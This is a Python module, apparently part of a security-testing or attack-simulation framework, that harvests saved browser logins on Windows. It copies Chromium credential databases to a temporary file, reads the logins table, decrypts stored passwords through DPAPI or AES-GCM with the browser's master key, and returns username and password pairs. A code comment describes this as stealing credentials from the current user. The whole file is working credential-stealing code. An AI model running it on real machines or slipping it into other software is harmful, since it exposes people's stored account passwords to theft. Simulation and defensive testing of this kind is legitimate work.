import logging
import os
import shutil
import sqlite3
import string
import tempfile
from typing import Collection, List, Optional, Tuple

from Crypto.Cipher import AES

from common.credentials import Credentials, Password, Username
from common.types import Event
from common.utils.code_utils import secure_generate_random_string

from .browser_credentials_database_path import BrowserCredentialsDatabasePath
from .windows_decryption import win32crypt_unprotect_data

logger = logging.getLogger(__name__)


# TODO: use pathlib.Path, not str
class WindowsCredentialsDatabaseProcessor:
    def __call__(
        self, interrupt: Event, database_paths: Collection[BrowserCredentialsDatabasePath]
    ) -> Collection[Credentials]:
        credentials = []

        # TODO: make interruptible
        for database_path in database_paths:
            # copy database before querying it to bypass lock errors
            path = self._copy_db(database_path.database_file_path)
            if path:
                try:
                    credentials.extend(self._export_credentials(path, database_path.master_key))
                except Exception as err:
                    logger.debug(f"{err}")

                self._clean_file(path)

        return [
            # TODO: fix assumption that identity is a username, could be an email ID;
            #       or just let it be, anything that uses a `Username` which is actually
            #       an email ID will just fail and move on
            Credentials(identity=Username(username=username), secret=Password(password=password))
            for username, password in set(credentials)
        ]

    def _copy_db(self, database_path) -> Optional[str]:
        root_dir = [
            tempfile.gettempdir(),
            # NOTE: (This is not relevant ATM since we only steal credentials from
            # the current user, but leave this comment here for future reference.)
            # Using user tempfile will produce an error when impersonating users
            # (permission denied). Use a public directory in that case (uncomment the following):
            # os.environ.get("PUBLIC", None),
            # os.environ.get("SystemDrive", None) + "\\",
        ]
        random_name = secure_generate_random_string(n=9, character_set=string.ascii_lowercase)

        for r in root_dir:
            try:
                temp = os.path.join(r, random_name)
                shutil.copy(database_path, temp)
                return temp
            except Exception as err:
                logger.debug(f"{err}")

        return None

    def _export_credentials(self, db_path, master_key=None):
        """
        Exports credentials from the given database
        """

        database_query = "SELECT username_value, password_value FROM logins"

        credentials: List[Tuple[str, str]] = []

        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute(database_query)
        except Exception as err:
            logger.debug(f"{err}")
            return credentials

        for login, password in cursor.fetchall():
            try:
                # decrypt the password
                if password and password.startswith(b"v10"):  # chromium > v80
                    if master_key:
                        password = self._decrypt_v80(password, master_key)
                else:
                    try:
                        password_bytes = win32crypt_unprotect_data(
                            password,
                        )
                    except AttributeError:
                        try:
                            password_bytes = win32crypt_unprotect_data(
                                password,
                            )
                        except Exception:
                            password_bytes = None

                    if password_bytes not in [None, False]:
                        password = password_bytes.decode("utf-8")

                if not login and not password:
                    continue

                credentials.append((login, password))
            except Exception as err:
                logger.debug(f"{err}")

        conn.close()

        return credentials

    def _decrypt_v80(self, buff, master_key) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes

        return decrypted_pass

    def _clean_file(self, db_path):
        try:
            os.remove(db_path)
        except Exception as err:
            logger.debug(f"{err}")
